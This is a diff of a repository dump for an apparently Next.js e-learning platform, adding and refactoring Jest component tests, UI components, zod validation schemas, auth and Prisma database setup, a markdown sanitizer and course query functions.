+ 5: const mockProfileActions = profileActions as jest.Mocked<typeof profileActions>;
+ 6: describe("ProfileForm", () => {
+ 7:   const initialData = {
+ 8:     name: "Alex Smith",
+ 9:     headline: "Full Stack Engineer",
+10:     bio: "Passionate about educational software.",
+11:     website: "https://alexsmith.dev",
+12:     avatarUrl: "https://alexsmith.dev/avatar.png",
+13:   };
+14:   beforeEach(() => {
+15:     jest.clearAllMocks();
+16:   });
+17:   it("renders with initial profile values", () => {
+18:     render(<ProfileForm initialData={initialData} />);
+19:     expect(screen.getByLabelText(/full name/i)).toHaveValue("Alex Smith");
+20:     expect(screen.getByLabelText(/headline/i)).toHaveValue(
+21:       "Full Stack Engineer",
+22:     );
+23:     expect(screen.getByLabelText(/biography/i)).toHaveValue(
+24:       "Passionate about educational software.",
+25:     );
+26:     expect(screen.getByLabelText(/website/i)).toHaveValue(
+27:       "https://alexsmith.dev",
+28:     );
+29:     expect(screen.getByLabelText(/avatar url/i)).toHaveValue(
+30:       "https://alexsmith.dev/avatar.png",
+31:     );
+32:   });
+33:   it("submits updated data and displays success feedback", async () => {
+34:     mockProfileActions.updateProfileAction.mockResolvedValue({
+35:       success: true,
+36:       data: {
+37:         id: "user-1",
+38:         name: "Alex Updated",
+39:         email: "alex@example.com",
+40:         image: null,
+41:         headline: "Principal Engineer",
+42:         bio: initialData.bio,
+43:         website: initialData.website,
+44:         avatarUrl: initialData.avatarUrl,
+45:         createdAt: new Date(),
+46:       },
+47:     });
+48:     render(<ProfileForm initialData={initialData} />);
+49:     const nameInput = screen.getByLabelText(/full name/i);
+50:     fireEvent.change(nameInput, { target: { value: "Alex Updated" } });
+51:     const submitButton = screen.getByRole("button", { name: /save changes/i });
+52:     fireEvent.click(submitButton);
+53:     await waitFor(() => {
+54:       expect(mockProfileActions.updateProfileAction).toHaveBeenCalledWith(
+55:         expect.objectContaining({
+56:           name: "Alex Updated",
+57:         }),
+58:       );
+59:     });
+60:     await waitFor(() => {
+61:       expect(
+62:         screen.getByText(/profile updated successfully/i),
+63:       ).toBeInTheDocument();
+64:     });
+65:   });
+66:   it("displays error alert when action returns failure", async () => {
+67:     mockProfileActions.updateProfileAction.mockResolvedValue({
+68:       success: false,
+69:       error: "You cannot modify another user's profile",
+70:       code: "FORBIDDEN",
+71:     });
+72:     render(<ProfileForm initialData={initialData} />);
+73:     const submitButton = screen.getByRole("button", { name: /save changes/i });
+74:     fireEvent.click(submitButton);
+75:     await waitFor(() => {
+76:       expect(
+77:         screen.getByText(/you cannot modify another user's profile/i),
+78:       ).toBeInTheDocument();
+79:     });
+80:   });
+81: });
 `````
 
 ## File: src/components/features/profile/profile-form.tsx
@@ -13847,216 +15287,214 @@ tsconfig.json
 
 ## File: src/components/features/progress/__tests__/course-progress-bar.test.tsx
 `````typescript
- 1: import * as React from "react";
- 2: import { render, screen } from "@testing-library/react";
- 3: import { CourseProgressBar } from "../course-progress-bar";
- 4: describe("CourseProgressBar", () => {
- 5:   it("renders progress percentage and accessible attributes", () => {
- 6:     render(<CourseProgressBar progressPercentage={45} />);
- 7:     expect(screen.getByText("45% Complete")).toBeInTheDocument();
- 8:     const progressbar = screen.getByRole("progressbar");
- 9:     expect(progressbar).toHaveAttribute("aria-valuenow", "45");
-10:     expect(progressbar).toHaveAttribute("aria-valuemin", "0");
-11:     expect(progressbar).toHaveAttribute("aria-valuemax", "100");
-12:   });
-13:   it("clamps negative values to 0%", () => {
-14:     render(<CourseProgressBar progressPercentage={-10} />);
-15:     expect(screen.getByText("0% Complete")).toBeInTheDocument();
-16:     expect(screen.getByRole("progressbar")).toHaveAttribute(
-17:       "aria-valuenow",
-18:       "0",
-19:     );
-20:   });
-21:   it("clamps values over 100 to 100%", () => {
-22:     render(<CourseProgressBar progressPercentage={120} />);
-23:     expect(screen.getByText("100% Complete")).toBeInTheDocument();
-24:     expect(screen.getByRole("progressbar")).toHaveAttribute(
-25:       "aria-valuenow",
-26:       "100",
-27:     );
-28:   });
-29:   it("renders lesson count breakdown when provided", () => {
-30:     render(
-31:       <CourseProgressBar
-32:         progressPercentage={50}
-33:         completedLessons={2}
-34:         totalLessons={4}
-35:       />,
-36:     );
-37:     expect(screen.getByText("2/4 lessons")).toBeInTheDocument();
-38:     expect(screen.getByText("50% Complete")).toBeInTheDocument();
-39:   });
-40:   it("renders celebration badge when reaching 100%", () => {
-41:     render(
-42:       <CourseProgressBar progressPercentage={100} showCelebration={true} />,
-43:     );
-44:     expect(screen.getByRole("status")).toBeInTheDocument();
-45:     expect(screen.getByText("Course Completed!")).toBeInTheDocument();
-46:     expect(
-47:       screen.getByText("You have completed all lessons in this course."),
-48:     ).toBeInTheDocument();
-49:   });
-50:   it("does not render celebration badge when below 100%", () => {
-51:     render(
-52:       <CourseProgressBar progressPercentage={99} showCelebration={true} />,
-53:     );
-54:     expect(screen.queryByRole("status")).not.toBeInTheDocument();
-55:     expect(screen.queryByText("Course Completed!")).not.toBeInTheDocument();
-56:   });
-57:   it("does not render celebration badge when showCelebration is false even at 100%", () => {
-58:     render(
-59:       <CourseProgressBar progressPercentage={100} showCelebration={false} />,
-60:     );
-61:     expect(screen.queryByRole("status")).not.toBeInTheDocument();
-62:   });
-63: });
+ 1: import { render, screen } from "@testing-library/react";
+ 2: import { CourseProgressBar } from "../course-progress-bar";
+ 3: describe("CourseProgressBar", () => {
+ 4:   it("renders progress percentage and accessible attributes", () => {
+ 5:     render(<CourseProgressBar progressPercentage={45} />);
+ 6:     expect(screen.getByText("45% Complete")).toBeInTheDocument();
+ 7:     const progressbar = screen.getByRole("progressbar");
+ 8:     expect(progressbar).toHaveAttribute("aria-valuenow", "45");
+ 9:     expect(progressbar).toHaveAttribute("aria-valuemin", "0");
+10:     expect(progressbar).toHaveAttribute("aria-valuemax", "100");
+11:   });
+12:   it("clamps negative values to 0%", () => {
+13:     render(<CourseProgressBar progressPercentage={-10} />);
+14:     expect(screen.getByText("0% Complete")).toBeInTheDocument();
+15:     expect(screen.getByRole("progressbar")).toHaveAttribute(
+16:       "aria-valuenow",
+17:       "0",
+18:     );
+19:   });
+20:   it("clamps values over 100 to 100%", () => {
+21:     render(<CourseProgressBar progressPercentage={120} />);
+22:     expect(screen.getByText("100% Complete")).toBeInTheDocument();
+23:     expect(screen.getByRole("progressbar")).toHaveAttribute(
+24:       "aria-valuenow",
+25:       "100",
+26:     );
+27:   });
+28:   it("renders lesson count breakdown when provided", () => {
+29:     render(
+30:       <CourseProgressBar
+31:         progressPercentage={50}
+32:         completedLessons={2}
+33:         totalLessons={4}
+34:       />,
+35:     );
+36:     expect(screen.getByText("2/4 lessons")).toBeInTheDocument();
+37:     expect(screen.getByText("50% Complete")).toBeInTheDocument();
+38:   });
+39:   it("renders celebration badge when reaching 100%", () => {
+40:     render(
+41:       <CourseProgressBar progressPercentage={100} showCelebration={true} />,
+42:     );
+43:     expect(screen.getByRole("status")).toBeInTheDocument();
+44:     expect(screen.getByText("Course Completed!")).toBeInTheDocument();
+45:     expect(
+46:       screen.getByText("You have completed all lessons in this course."),
+47:     ).toBeInTheDocument();
+48:   });
+49:   it("does not render celebration badge when below 100%", () => {
+50:     render(
+51:       <CourseProgressBar progressPercentage={99} showCelebration={true} />,
+52:     );
+53:     expect(screen.queryByRole("status")).not.toBeInTheDocument();
+54:     expect(screen.queryByText("Course Completed!")).not.toBeInTheDocument();
+55:   });
+56:   it("does not render celebration badge when showCelebration is false even at 100%", () => {
+57:     render(
+58:       <CourseProgressBar progressPercentage={100} showCelebration={false} />,
+59:     );
+60:     expect(screen.queryByRole("status")).not.toBeInTheDocument();
+61:   });
+62: });
 `````
 
 ## File: src/components/features/progress/__tests__/lesson-completion-button.test.tsx
 `````typescript
-  1: import * as React from "react";
-  2: import { render, screen, fireEvent, waitFor } from "@testing-library/react";
-  3: import { LessonCompletionButton } from "../lesson-completion-button";
-  4: import * as progressActions from "@/actions/progress";
-  5: import { actionSuccess, actionFailure } from "@/lib/action-result";
-  6: jest.mock("@/actions/progress");
-  7: const mockActions = progressActions as jest.Mocked<typeof progressActions>;
-  8: describe("LessonCompletionButton", () => {
-  9:   const lessonId = "clh1234567890123456789012";
- 10:   beforeEach(() => {
- 11:     jest.clearAllMocks();
- 12:   });
- 13:   it("renders 'Mark as Complete' when initialIsCompleted is false", () => {
- 14:     render(
- 15:       <LessonCompletionButton lessonId={lessonId} initialIsCompleted={false} />,
- 16:     );
- 17:     expect(
- 18:       screen.getByRole("button", { name: /mark lesson complete/i }),
- 19:     ).toBeInTheDocument();
- 20:     expect(screen.getByText("Mark as Complete")).toBeInTheDocument();
- 21:   });
- 22:   it("renders 'Completed' when initialIsCompleted is true", () => {
- 23:     render(
- 24:       <LessonCompletionButton lessonId={lessonId} initialIsCompleted={true} />,
- 25:     );
- 26:     const button = screen.getByRole("button", {
- 27:       name: /mark lesson incomplete/i,
- 28:     });
- 29:     expect(button).toBeInTheDocument();
- 30:     expect(screen.getByText("Completed")).toBeInTheDocument();
- 31:     expect(button).toHaveAttribute("aria-pressed", "true");
- 32:   });
- 33:   it("toggles completion from incomplete to complete", async () => {
- 34:     const onToggleSuccess = jest.fn();
- 35:     mockActions.toggleLessonCompletionAction.mockResolvedValueOnce(
- 36:       actionSuccess({
- 37:         progress: {
- 38:           id: "prog_1",
- 39:           userId: "user_1",
- 40:           lessonId,
- 41:           isCompleted: true,
- 42:           completedAt: new Date(),
- 43:           lastAccessedAt: new Date(),
- 44:         },
- 45:         enrollment: {
- 46:           id: "enr_1",
- 47:           userId: "user_1",
- 48:           courseId: "course_1",
- 49:           status: "ACTIVE",
- 50:           progressPercentage: 25,
- 51:           enrolledAt: new Date(),
- 52:           completedAt: null,
- 53:           lastAccessedAt: new Date(),
- 54:         },
- 55:         percentage: 25,
- 56:       }),
- 57:     );
- 58:     render(
- 59:       <LessonCompletionButton
- 60:         lessonId={lessonId}
- 61:         initialIsCompleted={false}
- 62:         onToggleSuccess={onToggleSuccess}
- 63:       />,
- 64:     );
- 65:     const button = screen.getByRole("button", {
- 66:       name: /mark lesson complete/i,
- 67:     });
- 68:     fireEvent.click(button);
- 69:     await waitFor(() => {
- 70:       expect(mockActions.toggleLessonCompletionAction).toHaveBeenCalledWith({
- 71:         lessonId,
- 72:         completed: true,
- 73:       });
- 74:       expect(onToggleSuccess).toHaveBeenCalledWith(true);
- 75:       expect(screen.getByText("Completed")).toBeInTheDocument();
- 76:     });
- 77:   });
- 78:   it("toggles completion from complete to incomplete", async () => {
- 79:     const onToggleSuccess = jest.fn();
- 80:     mockActions.toggleLessonCompletionAction.mockResolvedValueOnce(
- 81:       actionSuccess({
- 82:         progress: {
- 83:           id: "prog_1",
- 84:           userId: "user_1",
- 85:           lessonId,
- 86:           isCompleted: false,
- 87:           completedAt: null,
- 88:           lastAccessedAt: new Date(),
- 89:         },
- 90:         enrollment: {
- 91:           id: "enr_1",
- 92:           userId: "user_1",
- 93:           courseId: "course_1",
- 94:           status: "ACTIVE",
- 95:           progressPercentage: 0,
- 96:           enrolledAt: new Date(),
- 97:           completedAt: null,
- 98:           lastAccessedAt: new Date(),
- 99:         },
-100:         percentage: 0,
-101:       }),
-102:     );
-103:     render(
-104:       <LessonCompletionButton
-105:         lessonId={lessonId}
-106:         initialIsCompleted={true}
-107:         onToggleSuccess={onToggleSuccess}
-108:       />,
-109:     );
-110:     const button = screen.getByRole("button", {
-111:       name: /mark lesson incomplete/i,
-112:     });
-113:     fireEvent.click(button);
-114:     await waitFor(() => {
-115:       expect(mockActions.toggleLessonCompletionAction).toHaveBeenCalledWith({
-116:         lessonId,
-117:         completed: false,
-118:       });
-119:       expect(onToggleSuccess).toHaveBeenCalledWith(false);
-120:       expect(screen.getByText("Mark as Complete")).toBeInTheDocument();
-121:     });
-122:   });
-123:   it("displays error message on action failure", async () => {
-124:     mockActions.toggleLessonCompletionAction.mockResolvedValueOnce(
-125:       actionFailure(
-126:         "You must enroll in this course to access this lesson",
-127:         "FORBIDDEN",
-128:       ),
-129:     );
-130:     render(
-131:       <LessonCompletionButton lessonId={lessonId} initialIsCompleted={false} />,
-132:     );
-133:     const button = screen.getByRole("button", {
-134:       name: /mark lesson complete/i,
-135:     });
-136:     fireEvent.click(button);
-137:     await waitFor(() => {
-138:       expect(screen.getByRole("alert")).toHaveTextContent(
-139:         "You must enroll in this course to access this lesson",
-140:       );
-141:     });
-142:   });
-143: });
+  1: import { render, screen, fireEvent, waitFor } from "@testing-library/react";
+  2: import { LessonCompletionButton } from "../lesson-completion-button";
+  3: import * as progressActions from "@/actions/progress";
+  4: import { actionSuccess, actionFailure } from "@/lib/action-result";
+  5: jest.mock("@/actions/progress");
+  6: const mockActions = progressActions as jest.Mocked<typeof progressActions>;
+  7: describe("LessonCompletionButton", () => {
+  8:   const lessonId = "clh1234567890123456789012";
+  9:   beforeEach(() => {
+ 10:     jest.clearAllMocks();
+ 11:   });
+ 12:   it("renders 'Mark as Complete' when initialIsCompleted is false", () => {
+ 13:     render(
+ 14:       <LessonCompletionButton lessonId={lessonId} initialIsCompleted={false} />,
+ 15:     );
+ 16:     expect(
+ 17:       screen.getByRole("button", { name: /mark lesson complete/i }),
+ 18:     ).toBeInTheDocument();
+ 19:     expect(screen.getByText("Mark as Complete")).toBeInTheDocument();
+ 20:   });
+ 21:   it("renders 'Completed' when initialIsCompleted is true", () => {
+ 22:     render(
+ 23:       <LessonCompletionButton lessonId={lessonId} initialIsCompleted={true} />,
+ 24:     );
+ 25:     const button = screen.getByRole("button", {
+ 26:       name: /mark lesson incomplete/i,
+ 27:     });
+ 28:     expect(button).toBeInTheDocument();
+ 29:     expect(screen.getByText("Completed")).toBeInTheDocument();
+ 30:     expect(button).toHaveAttribute("aria-pressed", "true");
+ 31:   });
+ 32:   it("toggles completion from incomplete to complete", async () => {
+ 33:     const onToggleSuccess = jest.fn();
+ 34:     mockActions.toggleLessonCompletionAction.mockResolvedValueOnce(
+ 35:       actionSuccess({
+ 36:         progress: {
+ 37:           id: "prog_1",
+ 38:           userId: "user_1",
+ 39:           lessonId,
+ 40:           isCompleted: true,
+ 41:           completedAt: new Date(),
+ 42:           lastAccessedAt: new Date(),
+ 43:         },
+ 44:         enrollment: {
+ 45:           id: "enr_1",
+ 46:           userId: "user_1",
+ 47:           courseId: "course_1",
+ 48:           status: "ACTIVE",
+ 49:           progressPercentage: 25,
+ 50:           enrolledAt: new Date(),
+ 51:           completedAt: null,
+ 52:           lastAccessedAt: new Date(),
+ 53:         },
+ 54:         percentage: 25,
+ 55:       }),
+ 56:     );
+ 57:     render(
+ 58:       <LessonCompletionButton
+ 59:         lessonId={lessonId}
+ 60:         initialIsCompleted={false}
+ 61:         onToggleSuccess={onToggleSuccess}
+ 62:       />,
+ 63:     );
+ 64:     const button = screen.getByRole("button", {
+ 65:       name: /mark lesson complete/i,
+ 66:     });
+ 67:     fireEvent.click(button);
+ 68:     await waitFor(() => {
+ 69:       expect(mockActions.toggleLessonCompletionAction).toHaveBeenCalledWith({
+ 70:         lessonId,
+ 71:         completed: true,
+ 72:       });
+ 73:       expect(onToggleSuccess).toHaveBeenCalledWith(true);
+ 74:       expect(screen.getByText("Completed")).toBeInTheDocument();
+ 75:     });
+ 76:   });
+ 77:   it("toggles completion from complete to incomplete", async () => {
+ 78:     const onToggleSuccess = jest.fn();
+ 79:     mockActions.toggleLessonCompletionAction.mockResolvedValueOnce(
+ 80:       actionSuccess({
+ 81:         progress: {
+ 82:           id: "prog_1",
+ 83:           userId: "user_1",
+ 84:           lessonId,
+ 85:           isCompleted: false,
+ 86:           completedAt: null,
+ 87:           lastAccessedAt: new Date(),
+ 88:         },
+ 89:         enrollment: {
+ 90:           id: "enr_1",
+ 91:           userId: "user_1",
+ 92:           courseId: "course_1",
+ 93:           status: "ACTIVE",
+ 94:           progressPercentage: 0,
+ 95:           enrolledAt: new Date(),
+ 96:           completedAt: null,
+ 97:           lastAccessedAt: new Date(),
+ 98:         },
+ 99:         percentage: 0,
+100:       }),
+101:     );
+102:     render(
+103:       <LessonCompletionButton
+104:         lessonId={lessonId}
+105:         initialIsCompleted={true}
+106:         onToggleSuccess={onToggleSuccess}
+107:       />,
+108:     );
+109:     const button = screen.getByRole("button", {
+110:       name: /mark lesson incomplete/i,
+111:     });
+112:     fireEvent.click(button);
+113:     await waitFor(() => {
+114:       expect(mockActions.toggleLessonCompletionAction).toHaveBeenCalledWith({
+115:         lessonId,
+116:         completed: false,
+117:       });
+118:       expect(onToggleSuccess).toHaveBeenCalledWith(false);
+119:       expect(screen.getByText("Mark as Complete")).toBeInTheDocument();
+120:     });
+121:   });
+122:   it("displays error message on action failure", async () => {
+123:     mockActions.toggleLessonCompletionAction.mockResolvedValueOnce(
+124:       actionFailure(
+125:         "You must enroll in this course to access this lesson",
+126:         "FORBIDDEN",
+127:       ),
+128:     );
+129:     render(
+130:       <LessonCompletionButton lessonId={lessonId} initialIsCompleted={false} />,
+131:     );
+132:     const button = screen.getByRole("button", {
+133:       name: /mark lesson complete/i,
+134:     });
+135:     fireEvent.click(button);
+136:     await waitFor(() => {
+137:       expect(screen.getByRole("alert")).toHaveTextContent(
+138:         "You must enroll in this course to access this lesson",
+139:       );
+140:     });
+141:   });
+142: });
 `````
 
 ## File: src/components/features/progress/course-progress-bar.tsx
@@ -14813,6 +16251,119 @@ tsconfig.json
 47: export { ModeToggle };
 `````
 
+## File: src/components/ui/__tests__/card.test.tsx
+`````typescript
+ 1: import { render, screen } from "@testing-library/react";
+ 2: import {
+ 3:   Card,
+ 4:   CardHeader,
+ 5:   CardTitle,
+ 6:   CardDescription,
+ 7:   CardContent,
+ 8:   CardFooter,
+ 9: } from "../card";
+10: describe("Card", () => {
+11:   it("renders children", () => {
+12:     render(
+13:       <Card>
+14:         <CardContent>Test content</CardContent>
+15:       </Card>,
+16:     );
+17:     expect(screen.getByText("Test content")).toBeInTheDocument();
+18:   });
+19:   it("renders with title", () => {
+20:     render(
+21:       <Card>
+22:         <CardHeader>
+23:           <CardTitle>Card Title</CardTitle>
+24:         </CardHeader>
+25:       </Card>,
+26:     );
+27:     expect(screen.getByText("Card Title")).toBeInTheDocument();
+28:   });
+29:   it("renders with description", () => {
+30:     render(
+31:       <Card>
+32:         <CardHeader>
+33:           <CardTitle>Title</CardTitle>
+34:           <CardDescription>Description text</CardDescription>
+35:         </CardHeader>
+36:       </Card>,
+37:     );
+38:     expect(screen.getByText("Description text")).toBeInTheDocument();
+39:   });
+40:   it("renders with footer", () => {
+41:     render(
+42:       <Card>
+43:         <CardContent>Content</CardContent>
+44:         <CardFooter>Footer content</CardFooter>
+45:       </Card>,
+46:     );
+47:     expect(screen.getByText("Footer content")).toBeInTheDocument();
+48:   });
+49:   it("applies custom className", () => {
+50:     const { container } = render(
+51:       <Card className="custom-class">
+52:         <CardContent>Content</CardContent>
+53:       </Card>,
+54:     );
+55:     expect(container.firstChild).toHaveClass("custom-class");
+56:   });
+57: });
+`````
+
+## File: src/components/ui/badge.tsx
+`````typescript
+ 1: import { mergeProps } from "@base-ui/react/merge-props";
+ 2: import { useRender } from "@base-ui/react/use-render";
+ 3: import { cva, type VariantProps } from "class-variance-authority";
+ 4: import { cn } from "@/lib/utils";
+ 5: const badgeVariants = cva(
+ 6:   "group/badge inline-flex h-5 w-fit shrink-0 items-center justify-center gap-1 overflow-hidden rounded-4xl border border-transparent px-2 py-0.5 text-xs font-medium whitespace-nowrap transition-all focus-visible:border-ring focus-visible:ring-[3px] focus-visible:ring-ring/50 has-data-[icon=inline-end]:pr-1.5 has-data-[icon=inline-start]:pl-1.5 aria-invalid:border-destructive aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 [&>svg]:pointer-events-none [&>svg]:size-3!",
+ 7:   {
+ 8:     variants: {
+ 9:       variant: {
+10:         default: "bg-primary text-primary-foreground [a]:hover:bg-primary/80",
+11:         secondary:
+12:           "bg-secondary text-secondary-foreground [a]:hover:bg-secondary/80",
+13:         destructive:
+14:           "bg-destructive/10 text-destructive focus-visible:ring-destructive/20 dark:bg-destructive/20 dark:focus-visible:ring-destructive/40 [a]:hover:bg-destructive/20",
+15:         outline:
+16:           "border-border text-foreground [a]:hover:bg-muted [a]:hover:text-muted-foreground",
+17:         ghost:
+18:           "hover:bg-muted hover:text-muted-foreground dark:hover:bg-muted/50",
+19:         link: "text-primary underline-offset-4 hover:underline",
+20:       },
+21:     },
+22:     defaultVariants: {
+23:       variant: "default",
+24:     },
+25:   },
+26: );
+27: function Badge({
+28:   className,
+29:   variant = "default",
+30:   render,
+31:   ...props
+32: }: useRender.ComponentProps<"span"> & VariantProps<typeof badgeVariants>) {
+33:   return useRender({
+34:     defaultTagName: "span",
+35:     props: mergeProps<"span">(
+36:       {
+37:         className: cn(badgeVariants({ variant }), className),
+38:       },
+39:       props,
+40:     ),
+41:     render,
+42:     state: {
+43:       slot: "badge",
+44:       variant,
+45:     },
+46:   });
+47: }
+48: export { Badge, badgeVariants };
+`````
+
 ## File: src/components/ui/goey-toaster.tsx
 `````typescript
  1: "use client";
@@ -15159,6 +16710,35 @@ tsconfig.json
 31:     expect(slugify("     ", "fallback-slug")).toBe("fallback-slug");
 32:   });
 33: });
+`````
+
+## File: src/lib/__tests__/utils.test.ts
+`````typescript
+ 1: import { cn } from "../utils";
+ 2: describe("cn", () => {
+ 3:   it("merges class names", () => {
+ 4:     const result = cn("text-red-500", "text-blue-500");
+ 5:     expect(result).toBe("text-blue-500");
+ 6:   });
+ 7:   it("handles conditional classes", () => {
+ 8:     const result = cn("base", false && "hidden", "extra");
+ 9:     expect(result).toContain("base");
+10:     expect(result).toContain("extra");
+11:     expect(result).not.toContain("hidden");
+12:   });
+13:   it("handles undefined and null", () => {
+14:     const result = cn("base", undefined, null);
+15:     expect(result).toBe("base");
+16:   });
+17:   it("merges tailwind conflicts", () => {
+18:     const result = cn("p-2 p-4");
+19:     expect(result).toBe("p-4");
+20:   });
+21:   it("handles empty input", () => {
+22:     const result = cn();
+23:     expect(result).toBe("");
+24:   });
+25: });
 `````
 
 ## File: src/lib/__tests__/video.test.ts
@@ -15540,7 +17120,7 @@ tsconfig.json
  43:       expect(httpUrlSchema.safeParse("not a url").success).toBe(false);
  44:     });
  45:     it("rejects URL exceeding 500 characters", () => {
- 46:       const longUrl = "https://example.com/" + "a".repeat(500);
+ 46:       const longUrl = `https://example.com/${"a".repeat(500)}`;
  47:       expect(httpUrlSchema.safeParse(longUrl).success).toBe(false);
  48:     });
  49:   });
@@ -16059,6 +17639,30 @@ tsconfig.json
 15: >;
 `````
 
+## File: src/lib/validations/user.ts
+`````typescript
+ 1: import * as z from "zod";
+ 2: export const updateProfileSchema = z.object({
+ 3:   name: z
+ 4:     .string()
+ 5:     .min(2, "Name must be at least 2 characters")
+ 6:     .max(100, "Name must be at most 100 characters")
+ 7:     .optional(),
+ 8:   image: z.url("Invalid image URL").optional(),
+ 9: });
+10: export const assignRoleSchema = z.object({
+11:   userId: z.string().min(1, "User ID is required"),
+12:   roleId: z.string().min(1, "Role ID is required"),
+13: });
+14: export const removeRoleSchema = z.object({
+15:   userId: z.string().min(1, "User ID is required"),
+16:   roleId: z.string().min(1, "Role ID is required"),
+17: });
+18: export type UpdateProfileInput = z.infer<typeof updateProfileSchema>;
+19: export type AssignRoleInput = z.infer<typeof assignRoleSchema>;
+20: export type RemoveRoleInput = z.infer<typeof removeRoleSchema>;
+`````
+
 ## File: src/lib/action-result.ts
 `````typescript
  1: export type ActionSuccess<T> = {
@@ -16092,6 +17696,13 @@ tsconfig.json
 29: }
 `````
 
+## File: src/lib/auth-client.ts
+`````typescript
+1: import { createAuthClient } from "better-auth/react";
+2: export const authClient = createAuthClient();
+3: export const { signIn, signUp, signOut, useSession, getSession } = authClient;
+`````
+
 ## File: src/lib/auth-helpers.ts
 `````typescript
  1: import { getCurrentSession } from "@/services/auth";
@@ -16121,6 +17732,27 @@ tsconfig.json
 25:     return null;
 26:   }
 27: }
+`````
+
+## File: src/lib/db.ts
+`````typescript
+ 1: import { neonConfig } from "@neondatabase/serverless";
+ 2: import { PrismaNeon } from "@prisma/adapter-neon";
+ 3: import { PrismaClient } from "@prisma/client";
+ 4: import ws from "ws";
+ 5: neonConfig.webSocketConstructor = ws;
+ 6: const prismaClientSingleton = () => {
+ 7:   const adapter = new PrismaNeon({
+ 8:     connectionString: process.env.DATABASE_URL,
+ 9:   });
+10:   return new PrismaClient({ adapter });
+11: };
+12: const globalForPrisma = globalThis as unknown as {
+13:   prismaGlobal: ReturnType<typeof prismaClientSingleton> | undefined;
+14: };
+15: export const prisma = globalForPrisma.prismaGlobal ?? prismaClientSingleton();
+16: if (process.env.NODE_ENV !== "production")
+17:   globalForPrisma.prismaGlobal = prisma;
 `````
 
 ## File: src/lib/sanitizer.ts
@@ -16189,7 +17821,7 @@ tsconfig.json
  62:   },
  63:   exclusiveFilter: (frame) => {
  64:     if (frame.tag === "iframe") {
- 65:       const src = frame.attribs["src"];
+ 65:       const src = frame.attribs.src;
  66:       if (!src) return true;
  67:       try {
  68:         const parsed = new URL(src);
@@ -16205,7 +17837,7 @@ tsconfig.json
  78:       }
  79:     }
  80:     if (frame.tag === "img") {
- 81:       const src = frame.attribs["src"];
+ 81:       const src = frame.attribs.src;
  82:       if (!src) return true;
  83:       try {
  84:         const parsed = new URL(src);
@@ -16222,7 +17854,7 @@ tsconfig.json
  95: export async function markdownToSanitizedHtml(
  96:   markdown: string,
  97: ): Promise<string> {
- 98:   if (!markdown || !markdown.trim()) {
+ 98:   if (!markdown?.trim()) {
  99:     return "";
 100:   }
 101:   const rawHtml = await marked.parse(markdown, {
@@ -16707,138 +18339,137 @@ tsconfig.json
 368:     case "title_desc":
 369:       orderBy = { title: "desc" };
 370:       break;
-371:     case "newest":
-372:     default:
-373:       orderBy = { createdAt: "desc" };
-374:       break;
-375:   }
-376:   const [rawCourses, totalCount] = await Promise.all([
-377:     prisma.course.findMany({
-378:       where,
-379:       orderBy,
-380:       skip,
-381:       take: limit,
-382:       include: {
-383:         instructor: {
-384:           select: {
-385:             id: true,
-386:             name: true,
-387:             image: true,
-388:             avatarUrl: true,
-389:           },
-390:         },
-391:         _count: {
-392:           select: {
-393:             modules: true,
-394:             enrollments: true,
-395:           },
-396:         },
-397:       },
-398:     }),
-399:     prisma.course.count({ where }),
-400:   ]);
-401:   const courseIds = rawCourses.map((c) => c.id);
-402:   const lessonCountsByCourse = new Map<string, number>();
-403:   if (courseIds.length > 0) {
-404:     const modules = await prisma.module.findMany({
-405:       where: { courseId: { in: courseIds } },
-406:       select: {
-407:         courseId: true,
-408:         _count: {
-409:           select: { lessons: true },
-410:         },
-411:       },
-412:     });
-413:     for (const mod of modules) {
-414:       const current = lessonCountsByCourse.get(mod.courseId) ?? 0;
-415:       lessonCountsByCourse.set(mod.courseId, current + mod._count.lessons);
-416:     }
-417:   }
-418:   const courses: CatalogCourseRow[] = rawCourses.map((c) => ({
-419:     ...c,
-420:     totalLessons: lessonCountsByCourse.get(c.id) ?? 0,
-421:   }));
-422:   const totalPages = Math.ceil(totalCount / limit) || 1;
-423:   return {
-424:     courses,
-425:     totalCount,
-426:     page,
-427:     limit,
-428:     totalPages,
-429:   };
-430: }
-431: export async function findPublishedCourseCategories(): Promise<string[]> {
-432:   const results = await prisma.course.findMany({
-433:     where: {
-434:       status: CourseStatus.PUBLISHED,
-435:       category: { not: null },
-436:     },
-437:     select: {
-438:       category: true,
-439:     },
-440:     distinct: ["category"],
-441:     orderBy: {
-442:       category: "asc",
-443:     },
-444:   });
-445:   return results
-446:     .map((r) => r.category)
-447:     .filter((cat): cat is string => Boolean(cat?.trim()));
-448: }
-449: export async function updateCourse(
-450:   id: string,
-451:   data: Prisma.CourseUpdateInput,
-452: ): Promise<Course> {
-453:   return prisma.course.update({
-454:     where: { id },
-455:     data,
-456:   });
-457: }
-458: export async function deleteCourseAtomic(courseId: string): Promise<Course> {
-459:   return prisma.$transaction(async (tx) => {
-460:     await lockCourseForUpdate(tx, courseId);
-461:     return tx.course.delete({
-462:       where: { id: courseId },
-463:     });
-464:   });
-465: }
-466: export async function countCurriculumItems(
-467:   courseId: string,
-468:   tx?: Prisma.TransactionClient,
-469: ): Promise<{ moduleCount: number; lessonCount: number }> {
-470:   const client = tx ?? prisma;
-471:   const moduleCount = await client.module.count({
-472:     where: { courseId },
-473:   });
-474:   const lessonCount = await client.lesson.count({
-475:     where: {
-476:       module: { courseId },
-477:     },
-478:   });
-479:   return { moduleCount, lessonCount };
-480: }
-481: export async function executeCourseStatusTransition(
-482:   courseId: string,
-483:   fromStatuses: CourseStatus[],
-484:   toStatus: CourseStatus,
-485:   validator?: (tx: Prisma.TransactionClient) => Promise<void>,
-486: ): Promise<Course> {
-487:   return prisma.$transaction(async (tx) => {
-488:     const course = await lockCourseForUpdate(tx, courseId);
-489:     if (!fromStatuses.includes(course.status)) {
-490:       throw new ValidationError(
-491:         `Cannot transition course from ${course.status} to ${toStatus}`,
-492:       );
-493:     }
-494:     if (validator) {
-495:       await validator(tx);
-496:     }
-497:     return tx.course.update({
-498:       where: { id: courseId },
-499:       data: { status: toStatus },
-500:     });
-501:   });
-502: }
+371:     default:
+372:       orderBy = { createdAt: "desc" };
+373:       break;
+374:   }
+375:   const [rawCourses, totalCount] = await Promise.all([
+376:     prisma.course.findMany({
+377:       where,
+378:       orderBy,
+379:       skip,
+380:       take: limit,
+381:       include: {
+382:         instructor: {
+383:           select: {
+384:             id: true,
+385:             name: true,
+386:             image: true,
+387:             avatarUrl: true,
+388:           },
+389:         },
+390:         _count: {
+391:           select: {
+392:             modules: true,
+393:             enrollments: true,
+394:           },
+395:         },
+396:       },
+397:     }),
+398:     prisma.course.count({ where }),
+399:   ]);
